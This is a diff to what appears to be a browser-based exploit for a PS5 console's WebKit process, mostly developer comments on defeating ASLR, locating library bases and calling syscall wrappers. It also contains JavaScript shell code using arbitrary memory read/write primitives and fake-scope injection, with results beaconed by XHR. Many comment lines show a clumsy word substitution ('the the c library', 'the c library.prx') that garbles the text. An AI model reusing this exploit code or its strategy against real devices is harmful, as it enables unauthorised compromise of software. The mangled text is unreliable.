@@ -228,7 +228,7 @@
   the rtld era's dead frames; Phase A collects its stale ld.so pointers
   (+/-64MB window, page-deduped, the header page excluded), Phase B
   reads those data pages (strings = module paths; foreign pointers =
-  libc/libkernel), targets sorted DESCENDING so data pages are banked
+  the c library/the lk target), targets sorted DESCENDING so data pages are banked
   before any text-readability death; Phase C = blind data-est pages
   only if no targets. (2) The hit-read is PAGE-CLAMPED (both ends
   inside the anchor's own 16KB page). (3) The pair check takes EXACT
@@ -431,7 +431,7 @@
   classify every qword with the PRIOR-FREE foreign predicate:
   plausible code pointer (hi32 in [1,0x10], lo32>=0x400000), NOT
   our module, NOT cage, NOT stack. The struct pthread targets
-  light up with libkernel/libc pointers in whatever bands the
+  light up with the lk target/the c library pointers in whatever bands the
   WebProcess uses - each hit beacons with the PARENT CHAIN (the
   VM-window slot + the cage object it derefed) for backtracking.
 -->
@@ -467,9 +467,9 @@
   pointers from denormal doubles.
 
   V93 - the bands become the SPECIFIC measured module bands (the
-  parallel dynlib records): libc [0xF5000000,0xF7000000),
+  parallel dynlib records): the c library [0xF5000000,0xF7000000),
   boot.bin [0x6B000000,0x70000000), Fios2-class hi===1 &&
-  [0x80000000,0xE0000000), libkernel unchanged (below our base in
+  [0x80000000,0xE0000000), the lk target unchanged (below our base in
   our hi-band). The denormals, errnos, and flags all fall outside.
   The walk extends to 96 pages - reach the actual stack base where
   the pthread struct and its entry-function pointers live.
@@ -482,24 +482,24 @@
   deaths. The hunt fired on both scans - and caught only noise:
   the stack fps cap filled on PAGE 1 with OUR OWN MODULES return
   addresses + EncodedJSValues. CAUSE: this boots ASLR landed the
-  module base at lo32~202MB - INSIDE the old libkernel band
+  module base at lo32~202MB - INSIDE the old the lk target band
   (lo<0x10000000, calibrated from the parallel teams boot where
-  libkernel sits at lo32~138MB). The predicate matched the live
+  the lk target sits at lo32~138MB). The predicate matched the live
   LLInt stack (return addresses everywhere) and never descended.
 
   V92 - THE SELF-CALIBRATED PREDICATE (computed from this boots
   BASE at runtime):
-   - libkernel-band: hi32===modHi && lo32 in [0x400000, module_lo32
+   - the lk target-band: hi32===modHi && lo32 in [0x400000, module_lo32
      - 16MB) - a module in our hi-band but BELOW our base
    - sub-4GB system modules: hi32===0 && lo32>=0x40000000 (boot.bin
-     1.8GB, libc.prx 4.12GB) - the MB-scale data noise excluded
+     1.8GB, the c library.prx 4.12GB) - the MB-scale data noise excluded
    - the 4-8GB modules: hi32===1 (libSceFios2 7.4GB)
   Page 1 is noise-free under this predicate; the stack cap raised
   to 24; the walk descends to the base where the pthread struct
-  and its libc pointers live.
+  and its the c library pointers live.
 -->
 <!--
-  V91: V90 + THE FOREIGN-POINTER HUNT - the libc/libkernel beacon route.
+  V91: V90 + THE FOREIGN-POINTER HUNT - the the c library/the lk target beacon route.
 
   V90 (session 8P47R0): the skip finally fired perfectly - 81 16KB
   chunks swept the full proven RELRO segment right to the 0x7392000
@@ -510,17 +510,17 @@
   dynstr. The classic-GOT hunt is PARKED.
 
   THE PIVOT (the parallel effort's exec-only doc, measured 14.10):
-  libkernel text is EXECUTE-ONLY (PKU - never readable), but LIBC
-  TEXT IS READABLE - and libc holds strlen/memcpy/the pthread
+  the lk target text is EXECUTE-ONLY (PKU - never readable), but the c library
+  TEXT IS READABLE - and the c library holds strlen/memcpy/the pthread
   functions. Their loader reads an import slot that resolves into
-  libkernel, with the syscall instruction at libkernel_base+0xB57.
-  The route to libc: the pthread struct at the stack BASE carries
-  function pointers into libc. V91 hunts foreign pointers (the
+  the lk target, with the syscall instruction at the lk target_base+0xB57.
+  The route to the c library: the pthread struct at the stack BASE carries
+  function pointers into the c library. V91 hunts foreign pointers (the
   V89-fixed classifier now sees them):
    (a) the VM 128KB window (the GC thread structures);
    (b) a DEEP stack down-walk (64 pages, per-page scans, beaconed).
-  A libc pointer found = the libc base derivation (their corpus has
-  the 14.10 module map) = readable libc text = strlen for the
+  A the c library pointer found = the the c library base derivation (their corpus has
+  the 14.10 module map) = readable the c library text = strlen for the
   quartet + the syscall wrappers for E2's last item.
 -->
 <!--
@@ -556,8 +556,8 @@
 
   NO NAME/GOTRUN HITS IN 1.25MB - AND THE REASON IS MY DETECTOR:
   the plausible-pointer filter required hi32>0, but the PS5's foreign
-  module VAs are ALL sub-4GB (libc.prx 0xF5F74000, boot.bin
-  0x6BEE8000 - hi32===0). Every libc import pointer BROKE the runs
+  module VAs are ALL sub-4GB (the c library.prx 0xF5F74000, boot.bin
+  0x6BEE8000 - hi32===0). Every the c library import pointer BROKE the runs
   the detector was hunting - the GOT may already be in the swept
   data, invisible. V89: (hi32===0 && lo32>=0x400000) || (hi32>0 &&
   hi32<0x20); re-sweeps the PROVEN 1.25MB with the fixed predicate
@@ -608,7 +608,7 @@
   [0x724E000, 0x8000000), anchored immediately past the proven
   string-scan pages: (a) ASCII name patterns (strlen/memcpy/
   mprotect/gett*); (b) pointer-runs with FOREIGN entries (the GOT
-  shape - resolved imports point into foreign modules like libc.prx
+  shape - resolved imports point into foreign modules like the c library.prx
   at the 0x1B/0xF5 VA bands the parallel effort's dynlib doc maps).
   A dynstr hit + a GOT run = the import library, resolved from
   readable memory - then the JMPREL walk names every slot and the
@@ -3805,7 +3805,7 @@ try{
    * stack-resident (mallocd in the heap). THE MECHANISM: the VMs 128KB
    * window holds hundreds of CAGE pointers - the GC thread structures among
    * them; the WTF::Thread objects lead to mallocd struct pthreads whose
-   * start-routine and cleanup-handler pointers ARE libc/libkernel
+   * start-routine and cleanup-handler pointers ARE the c library/the lk target
    * pointers - in whatever bands the WebProcess actually uses. Absolute R/W
    * lets us CHASE the pointers instead of guessing bands.
    * THE PRIOR-FREE FOREIGN PREDICATE: plausible code pointer (hi32 in
@@ -4850,7 +4850,7 @@ function _startWsShell(){
       case 'ptrscan':{
         /* SHELL: THE POINTER-CLASS HARVEST. The exact-value scan can't
          * wildcard; the identification-by-call campaign needs the FULL
-         * list of pointers in a value band - the E2 targets (libc-class
+         * list of pointers in a value band - the E2 targets (the c library-class
          * imports tolerating RDI = the fake scope) hide in the module's
          * data band among vtables. Scans [start, start+len) for qwords
          * in [lo, hi), DEDUPED by value (the same fn ptr recurs across
@@ -5102,7 +5102,7 @@ function _startWsShell(){
          * ptrscan -> offline match -> callret x2, each a CLI round trip plus
          * analysis time) never fit inside the fuse. This runs the WHOLE
          * campaign in-page: harvest -> match vs window.E2_RVAS (the 13.60
-         * libkernel table, layout-stable on 14.10) -> verifier ladder
+         * the lk target table, layout-stable on 14.10) -> verifier ladder
          * (lk+0x1200 sceKernelGetCurrentCpu -> 0..7) -> E2 (lk+0x1B860
          * getpid wrapper -> the pid). Every stage beacons so a mid-ladder
          * death leaves the full trail in shell-beacons.log.
@@ -5116,10 +5116,22 @@ function _startWsShell(){
          * the try call's result was lost to a death inside the settle window). */
         function ELs(s){elog.push(s);try{var x=new XMLHttpRequest();x.open('POST','/beacon/'+encodeURIComponent('E2SHOT-'+s),false);x.send();}catch(e){}}
         try{bs('E2SHOT-START');}catch(e){}
+        /* v5: msg.base = a REGISTRY-DERIVED base (the low-14 matching is
+         * DEAD - the wrapper region spans 10+ 16KB pages so its low-14
+         * residues blanket the space; 333/339 RVAs pass any uniqueness
+         * filter; four sessions died on coincidence-math candidates). With
+         * base given, skip harvest/match and verify the witness directly. */
+        var forcedBase=null;
+        if(msg.base){try{forcedBase=BigInt(msg.base);}catch(e){reply.err='bad base';break;}}
         function EL(s){elog.push(s);try{bs('E2SHOT-'+s);}catch(e){}}
-        /* ---- stage 1: harvest the data band [BASE+0x7000000, BASE+0x7400000) ---- */
         var hStart=S.BASE+0x7000000n,hLen=0x400000;
         var vals=[],seenE={};
+        var cand={},clist=[];
+        if(forcedBase){
+          clist.push({B:forcedBase,pairs:0,wden:0,demo:['forced: registry-derived']});
+          ELs('forced base 0x'+forcedBase.toString(16));
+        }else{
+        /* ---- stage 1: harvest the data band [BASE+0x7000000, BASE+0x7400000) ---- */
         for(var off=0;off<hLen;off+=0x4000){
           var words;
           try{words=S.absRead(hStart+BigInt(off),0x4000);}catch(e){break;}
@@ -5168,6 +5180,7 @@ function _startWsShell(){
         clist.sort(function(a,b){return (b.pairs*1000+b.wden)-(a.pairs*1000+a.wden);});
         EL('candidates n='+clist.length+(clist.length?' top=0x'+clist[0].B.toString(16)+' pairs='+clist[0].pairs+' wden='+clist[0].wden:''));
         if(!clist.length){reply.log=elog;reply.err='no candidates';break;}
+        }
         /* ---- stage 3: verifier ladder ---- */
         function e2call(t){
           if(S.scopeSlot&&S.fakeScope&&S.scopeOrig)S.absWrite(S.scopeSlot,S.fakeScope);
@@ -5195,7 +5208,7 @@ function _startWsShell(){
          * preflights -6/-6 then death at the first foreign call. Root cause
          * (complete): raw syscall wrappers pass the kernel's RAX through and
          * FreeBSD-family kernels return POSITIVE errnos - open("") -> RAX=2
-         * (ENOENT), not -1 (the -1 conversion lives in libc, above the
+         * (ENOENT), not -1 (the -1 conversion lives in the c library, above the
          * wrapper). Every raw return so far (0, 0, 2) was an invalid JSValue
          * encoding and crashed the engine at first touch - WITH THE BASES
          * LIKELY RIGHT ALL THREE TIMES.
